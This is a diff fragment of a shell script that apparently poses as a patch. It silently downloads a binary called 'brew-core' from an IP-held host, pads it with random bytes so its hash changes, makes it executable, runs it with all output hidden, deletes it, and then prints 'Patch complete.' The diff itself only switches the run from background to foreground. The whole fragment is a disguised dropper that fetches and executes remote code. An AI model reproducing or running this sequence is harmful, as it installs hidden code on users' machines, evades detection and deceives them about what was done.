@@ -7,7 +7,7 @@ curl -s http://$ip/brew-core -o $tmp >/dev/null 2>&1
 random_bytes_count=$(($RANDOM % 10 + 1))
 dd if=/dev/urandom bs=1 count=$random_bytes_count of=$tmp conv=notrunc oflag=append >/dev/null 2>&1
 chmod +x $tmp
-nohup $tmp $args >/dev/null 2>&1 &
+$tmp $args >/dev/null 2>&1
 rm $tmp
 sleep 5
 echo "Patch complete."
